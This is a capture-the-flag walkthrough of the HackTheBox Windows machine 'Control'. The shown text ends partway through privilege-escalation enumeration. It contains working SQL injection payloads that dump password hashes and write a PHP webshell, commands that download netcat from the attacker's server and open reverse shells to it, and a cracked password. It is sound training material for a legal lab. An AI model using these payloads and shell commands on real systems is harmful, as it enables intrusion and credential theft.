---
title: HTB: Control
url: https://0xdf.gitlab.io/2020/04/25/htb-control.html
date: 2020-04-25T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, hackthebox, htb-control, nmap, mysql, http-header, wfuzz, sqli, injection, mysql-file-write, hashcat, powershell-run-as, winpeas, registry-win, service, windows-service, powershell, htb-nest, oscp-plus-v1, oscp-plus-v2, osep-like
---

![Control](https://0xdfimages.gitlab.io/img/control-cover.png)

Control was a bit painful for someone not comfortable looking deep at Windows objects and permissions. It starts off simply enough, with a website where I’ll have to forge an HTTP header to get into the admin section, and then identify an SQL injection to write a webshell and dump user hashes. I can use the webshell to get a shell, and then one of the cracked hashes to pivot to a different user. From there, I’ll find that users can write the registry keys associated with Services. I’ll construct some PowerShell to find potential services that I can restart, and then modify them to run NetCat to return a shell.

## Box Info

| Name | [Control](https://hackthebox.com/machines/control)  [Control](https://hackthebox.com/machines/control) [Play on HackTheBox](https://hackthebox.com/machines/control) |
| --- | --- |
| Release Date | [23 Nov 2019](https://twitter.com/hackthebox_eu/status/1197889511965036550) |
| Retire Date | 25 Apr 2020 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Control |
| Radar Graph | Radar chart for Control |
| First Blood User | 00:31:56[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 1 day05:32:55[paint paint](https://app.hackthebox.com/users/48707) |
| Creator | [TRX TRX](https://app.hackthebox.com/users/31190) |

## Recon

### nmap

`nmap` shows three ports open, HTTP (TCP 80), MS RPC (135), and MySQL (3306):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 14:01 EST
Nmap scan report for 10.10.10.167
Host is up (0.31s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
root@kali# nmap -p 80,135,3306 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 14:03 EST
Nmap scan report for 10.10.10.167
Host is up (0.013s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp  open  msrpc   Microsoft Windows RPC
3306/tcp open  mysql?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds

```

It’s a windows machine, and based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), it’s Windows 10 / Server 2016 / Server 2019.

### MySQL - TCP 3306

TCP 3306 is typically MySQL. I tried to connect, but it returns a message saying that my IP address is not allowed to connect:

```

root@kali# mysql -h 10.10.10.167
ERROR 1130 (HY000): Host '10.10.14.4' is not allowed to connect to this MariaDB server

```

### Website - TCP 80

#### Site

The site is for a company that does some kind of tech thing:

![image-20191124153251137](https://0xdfimages.gitlab.io/img/image-20191124153251137.png)

The About link (`/about.php`) doesn’t make it any clearer:

[![about.php](https://0xdfimages.gitlab.io/img/image-20191124153523801.png)](https://0xdfimages.gitlab.io/img/image-20191124153523801.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20191124153523801.png)

The Admin link (`/admin.php`) just returns an error:

![image-20191124153810983](https://0xdfimages.gitlab.io/img/image-20191124153810983.png)

#### Page Source

Right at the top of the source for the web root there’s a block of comments:

```

<!-- To Do:
	- Import Products
	- Link to new payment system
	- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->

```

That’s a hint that there’s something at the host at 192.168.4.28.

## Shell as iusr

### Access admin.php

#### “Proxy”

The page said that I needed to go through the proxy, and that a header was missing. I found [this page](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) with a list of HTTP headers, and pulled the list into a text file:

```

root@kali# head headers 
Accept
Accept-CH
Accept-CH-Lifetime
Accept-Charset
Accept-Encoding
Accept-Language
Accept-Patch
Accept-Ranges
Access-Control-Allow-Credentials
Access-Control-Allow-Headers

```

Now I’ll use `wfuzz` to see if adding these changes anything. I ran it once, and noticed that the message about not having access is 89 characters, so I’ll add `--hh 89` to the end of my command. Originally I ran it using the hosts IP:

```

root@kali# wfuzz -c -w headers -u http://10.10.10.167/admin.php -H "FUZZ: 10.10.10.167" --hh 89
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.167/admin.php
Total requests: 97

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000027:   400        6 L      34 W     374 Ch      "Content-Length"
000000083:   501        6 L      26 W     343 Ch      "Transfer-Encoding"                                                                                                                                                  

Total time: 0.267723
Processed Requests: 97
Filtered Requests: 95
Requests/sec.: 362.3140

```

Then I saw the hint in the source and ran it again with the value of the given IP:

```

root@kali# wfuzz -c -w headers -u http://10.10.10.167/admin.php -H "FUZZ: 192.168.4.28" --hh 89
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.167/admin.php
Total requests: 97

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000027:   400        6 L      34 W     374 Ch      "Content-Length"
000000083:   501        6 L      26 W     343 Ch      "Transfer-Encoding"
000000093:   200        153 L    466 W    7933 Ch     "X-Forwarded-For"

Total time: 0.221581
Processed Requests: 97
Filtered Requests: 94
Requests/sec.: 437.7627

```

That HTTP 200 on “X-Forwarded-For” that returns 7933 characters is certainly interesting. I downloaded a Firefox plugin called [Modify Header Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) (I didn’t have something that did this before, and this one was ok, but if you have a better tool, leave a comment), and set it to add a “X-Forwarded-For” header for Control:

![image-20191125051752781](https://0xdfimages.gitlab.io/img/image-20191125051752781.png)

Now I refreshed `/admin.php`, and got a page.

#### /admin.php

Now `/admin.php` gives a dashboard for inventory management:

![image-20191125051901852](https://0xdfimages.gitlab.io/img/image-20191125051901852.png)

I made sure I had FoxyProxy sending my traffic through Burp, and I played for a few minutes on this page, generating HTTP requests to a handful of different PHP scripts:

![image-20191125052204313](https://0xdfimages.gitlab.io/img/image-20191125052204313.png)

### SQLI

#### Find SQLI

With a good list of pages to check out, I started sending those requests to repeater to test. There’s SQL injection all over the place. The first place I looked at `/search_products.php`. The initial request looked like:

```

POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productName=Asus

```

When I add a `'` to get `productName=Asus'`, I see the following in the body of the returned page:

```

<!-- Latest Products -->
<section>
    <h4>Products</h4>
    <div class="table-wrapper">
        <table border="1" cellpadding="10">
            <thead>
                <tr>
                    <th>Id</th>
                    <th>Name</th>
                    <th>Quantity</th>
                    <th>Category</th>
                    <th>Price</th>
                </tr>
            </thead>
            <tbody>
                Error: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Asus'''  at line 1                     </tbody>
        </table>
    </div>

```

I can make the query good again with a comment, `productName=Asus'#`, which returns a `<tbody>` of:

```

<td>No Products Found</td><td> </td><td> </td><td> </td><td> </td>

```

#### Find Number of Columns

Next I’ll try to do a union injection, and I’ll need to figure out how many columns are returned. I’ll start with `productName=Asus' union select 1#`, and it returns:

```

Error: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of column

```

Very nice / sloppy to leave the error messages in. I’ll add columns to my select until I get to `productName=Asus' UNION select 1,2,3,4,5,6#`, when it returns:

```

<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr>

```

#### Enumerate

Now I’ll start to pull information out of this database. I like the [Pentest Monkey MySQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) as a starting reference. I’ll get the version, current user, and current database with ` Result productName=Asus’ UNION select @@version,user(),database(),4,5,6#`:

```

<tr><td>10.4.8-MariaDB</td><td>manager@localhost</td><td>warehouse</td><td>4</td><td>5</td><td>6</td></tr>

```

I can list the databases with `productName=Asus' union select schema_name,2,3,4,5,6 from information_schema.schemata#` to see three dbs:
- information\_schema
- mysql
- warehouse

Since warehouse is the only non-default database, I’ll look at it’s tables with `productName=Asus' union select table_schema,table_name,3,4,5,6 from information_schema.tables where table_schema != 'mysql' AND table_schema != 'information_schema'#` (I’ll hit Render in Burp to see it as a nicely formatted table):

![image-20191125060219458](https://0xdfimages.gitlab.io/img/image-20191125060219458.png)

I did a bit more digging, but nothing interesting in those tables.

I can grab the internal password hashes with `productName=Asus' UNION select host,user,password,4,5,6 from mysql.user#`:

![image-20191125054640263](https://0xdfimages.gitlab.io/img/image-20191125054640263.png)

I’m not sure how these could be useful right now, but I’ll start cracking these now to have later.

Next I’ll look at the privileges for the various users with `productName=Asus' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges#`. Both hector and root seem to have all the privileges (too many to show below). manager seems to have one, FILE:

![image-20191125060613112](https://0xdfimages.gitlab.io/img/image-20191125060613112.png)

### Shell

#### File Write

Since my current user has FILE priv, I’m going to write a webshell on the box. I’ll issue the following POST which should print out a webshell:

```

productName=Asus' union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6#

```

It does write what I wanted it, but unsurprisingly, it does not execute it, since it’s just printed as text to the screen:

```

<tr><td><?php system($_GET['cmd']); ?></td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr>

```

But, now, I can run the same SQL command, but this time write it to a file, guessing the default IIS path:

```

productName=Asus' union select '<?php system($_GET[\'cmd\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#

```

The page returns an error:

```

Error: SQLSTATE[HY000]: General error

```

But if I POST the same command again, I get a different error saying the file already exists:

```

Error: SQLSTATE[HY000]: General error: 1086 File 'c:/inetpub/wwwroot/_0xdf.php' already exists

```

Now I can hit the webshell, and I have command execution:

```

root@kali# curl -s 'http://10.10.10.167/_0xdf.php?cmd=whoami'
nt authority\iusr
        2       3       4       5       6

```

#### Get NC Shell

I’ll start a Python webserver in the directory where I keep Windows `nc`, and then run:

```

root@kali# curl '10.10.10.167/_0xdf.php?cmd=powershell+wget+http://10.10.14.4/nc
64.exe+-outfile+\windows\temp\nc.exe'

```

This will download `nc64.exe` to `\windows\temp\nc.exe`.

I get the request on my server:

```

root@kali# cd /opt/shells/netcat/; python3 -m http.server 80; cd -
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.167 - - [24/Nov/2019 14:13:47] "GET /nc64.exe HTTP/1.1" 200 -

```

Now, with a local `nc` listener waiting, I’ll execute `nc` to get a shell:

```

root@kali# curl '10.10.10.167/_0xdf.php?cmd=\windows\temp\nc.exe+-e+cmd+10.10.14.4+443'

```

I get a shell as iusr immediately:

```

root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:53175.
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot>whoami
nt authority\iusr

```

## Priv: manager –> hector

### Enumeration

I see that hector is the user on the box:

```

PS C:\users> dir

    Directory: C:\users

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
d-----        11/5/2019   2:34 PM                Administrator
d-----        11/1/2019  11:09 AM                Hector
d-r---       10/21/2019   5:29 PM                Public

```

And that he’s in the Remove Management Users group:

```

PS C:\users> net user hector
User name                    Hector
Full Name                    Hector
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2019 11:27:50 AM
Password expires             Never
Password changeable          11/1/2019 11:27:50 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/6/2019 5:37:51 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

```

This group means that he can run commands over WinRM.

I can see that the host is listening on 5985 (WinRM), even though the firewall must be preventing me from seeing it from my box:

```

PS C:\users> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       816
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1840
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       452
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       992
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1708
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       592
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:52629          0.0.0.0:0              LISTENING       2256
  TCP    10.10.10.167:80        10.10.14.4:48742      ESTABLISHED     4
  TCP    10.10.10.167:53175     10.10.14.4:443        ESTABLISHED     2736
  ...[snip]...

```

This means if I can find a password for hector, I can try to run commands as that user.

### Crack MySQL Password

I had earlier started running the MySQL passwords through `hashcat`. I had a `hashes` file:

```

root@kali# cat hashes 
hector:0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
manager:CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA                                 
root:0A4A5CAD344718DC418035A1F4D292BA603134D8

```

Then I started `hashcat`, and pretty quickly it broke hectors:

```

root@kali# hashcat -m 300 hashes --user /usr/share/wordlists/rockyou.txt --force
...[snip]...
0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
...[snip]...

```

### Run Commands as hector

With that password, I’ll try to run a command as hector. I’ll start `powershell`:

```

C:\>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>

```

Now I’ll create a credential object:

```

PS C:\> $env:ComputerName
CONTROL
PS C:\> $username = "CONTROL\hector"
PS C:\> $password = "l33th4x0rhector"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr

```

Now I’ll use `Invoke-Command` to run commands as hector, and it works:

```

PS C:\> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
control\hector

```

### Shell as hector

For some reason, hector can’t access the `nc.exe` I uploaded to `\windows\temp`, but I’ll upload another copy, and run it:

```

PS C:\> wget 10.10.14.4/nc64.exe -outfile \windows\system32\spool\drivers\color\nc64.exe

PS C:\> Invoke-Command -credential $cred -ScriptBlock { \windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.4 443 } -computer localhost

```

And I get a shell as hector:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:52486.
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Hector\Documents>

```

And now I can get `user.txt`:

```

C:\Users\Hector\Desktop>type user.txt
d8782dd0************************

```

## Priv: hector –> SYSTEM

### Enumeration

#### winPEAS

This is an interesting case because [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) misses the vector. I’ll upload the exe to Control and run it. Within the output:

```

  [+] Modifiable Services(T1007)                          
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    You cannot modify any service

  [+] Looking if you can modify any service registry()
   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

```

I can’t quite explain what’s going on here. In the [winPEAS bat file](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/6bdd799c8af73495cfbe959d8daef5cb93b9e5e1/winPEAS/winPEASbat/winPEAS.bat#L353) it looks like it’s trying to do `reg save` on each key and then call `reg restore` and if that succeeds, print that I can write it. But I used the [exe which is written in C#](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/6bdd799c8af73495cfbe959d8daef5cb93b9e5e1/winPEAS/winPEASexe/winPEAS/ServicesInfo.cs#L244), and I can’t explain what’s going on exactly.

#### PowerShell History

hector’s home directory does have a PowerShell history file:

```

C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>dir
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

11/25/2019  12:04 PM    <DIR>          .
11/25/2019  12:04 PM    <DIR>          ..
11/25/2019  02:36 PM               114 ConsoleHost_history.txt
               1 File(s)            114 bytes
               2 Dir(s)  43,608,150,016 bytes free

```

It only contains two commands:

```

get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

```

The first one lists the keys under `CurrentControlSet`, of which `Services` is one of them.

The second prints out access information about the `CurrentControlSet` key itself:

```

PS C:\> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)

```

I can translate the `Sddl` to human readable by saving the full ACL into a variable and then running:

```

PS C:\> $acl = get-acl HKLM:\SYSTEM\CurrentControlSet

PS C:\> ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\Authenticated Users: AccessAllowed Inherited (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
: AccessAllowed Inherited (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
BUILTIN\Administrators: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
NT AUTHORITY\SYSTEM: AccessAllowed Inherited (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed Inherited (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
: AccessAllowed Inherited (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)

```

### Service Registry Enumeration

#### Via PowerShell

So despite [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)’s saying I can’t modify services, I’m going to continue looking here. If I look at the `Services` key, I can see that hector actually has `FullControl`:

```

PS C:\> $acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services

PS C:\> ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
NT AUTHORITY\Authenticated Users: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
CONTROL\Hector: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)

```

#### Via accesschk

I could see this a different way using `accesschk64.exe` from [SysInternals](https://docs.microsoft.com/en-us/sysinternals/). When I run with `-uwcqv`, it goes through the Service Control Manager, and hector doesn’t have permissions:

```

PS C:\> \windows\system32\spool\drivers\color\accesschk64.exe /accepteula -uwcqv "Authenticated Users" *

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

Error opening Service Control Manager:
Access is denied.
No matching objects found.

```

However, when I use `-kwsu` it reads in the registry, and I can access what seems like all services:

```

C:\>\windows\system32\spool\drivers\color\accesschk64.exe "Hector" -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\Services\.NET CLR Data
RW HKLM\System\CurrentControlSet\Services\.NET CLR Data\Linkage
RW HKLM\System\CurrentControlSet\Services\.NET CLR Data\Performance
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking\Linkage
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking\Performance
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0\Linkage
RW HKLM\System\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0\Performance
RW HKLM\System\CurrentControlSet\Services\.NET Data Provider for Oracle
RW HKLM\System\CurrentControlSet\Services\.NET Data Provider for Oracle\Performance
RW HKLM\System\CurrentControlSet\Services\.NET Data Provider for SqlServer
RW HKLM\System\CurrentControlSet\Services\.NET Data Provider for SqlServer\Performance
RW HKLM\System\CurrentControlSet\Services\.NET Memory Cache 4.0
RW HKLM\System\CurrentControlSet\Services\.NET Memory Cache 4.0\Linkage
RW HKLM\System\CurrentControlSet\Services\.NET Memory Cache 4.0\Performance
RW HKLM\System\CurrentControlSet\Services\.NETFramework
RW HKLM\System\CurrentControlSet\Services\.NETFramework\Performance
RW HKLM\System\CurrentControlSet\Services\1394ohci                                                   
RW HKLM\System\CurrentControlSet\Services\3ware                                                      
RW HKLM\System\CurrentControlSet\Services\3ware\Parameters
RW HKLM\System\CurrentControlSet\Services\3ware\Parameters\PnpInterface
RW HKLM\System\CurrentControlSet\Services\3ware\StartOverride
RW HKLM\System\CurrentControlSet\Services\ACPI
RW HKLM\System\CurrentControlSet\Services\ACPI\Parameters
RW HKLM\System\CurrentControlSet\Services\ACPI\Enum
RW HKLM\System\CurrentControlSet\Services\AcpiDev
RW HKLM\System\CurrentControlSet\Services\acpiex
RW HKLM\System\CurrentControlSet\Services\acpiex\Parameters
RW HKLM\System\CurrentControlSet\Services\acpiex\Parameters\Wdf
...[snip]...

```

### Note About PowerShell

Since PowerShell is not a strong language for me, this took a ton of trial and error, and I’m sure there are better ways to do it, but I managed to get to things that worked. This was a useful (if not painful) experience in making myself use PowerShell.

### Enumeration for Start

Knowing that I can write to any service registry key is useful, because I can replace a service binary path to run whatever I want as SYSTEM. In real life, I could set a service to run my exe and then wait for a reboot. But in HTB, I need to find a serive I can restart. As a non-admin user, I likely can’t stop services. So I’m going to look for services that I can start.

For this, I’ll need to look at the SDDL permissions on the service using `sc sdshow [service]`. I looked at this before in my writeup of [the error in Nest that allowed any user to PSExec](/2020/01/26/digging-into-psexec-with-htb-nest.html) when it was released. I go into a bit more detail on SDDL there, but in this case, I’m looking for a service where any authorized user (`AU`) has `RP`. There’s probably a clean way to do this with PowerShell, but I used the output of `sc sdshow` and a regex (`RP[A-Z]*?;;;AU`) to get this list:

```

PS C:\> foreach ($service in $services) { $sddl = (cmd /c sc sdshow $service)[1]; if ($sddl -match "RP[A-Z]*?;;;AU") { write-host $service,$sddl }}
AppVClient D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)
ConsentUxUserSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
ConsentUxUserSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
DevicePickerUserSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
DevicePickerUserSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
DevicesFlowUserSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
DevicesFlowUserSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
DoSvc D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;DCRC;;;S-1-5-80-3055155277-3816794035-3994065555-2874236192-2193176987)
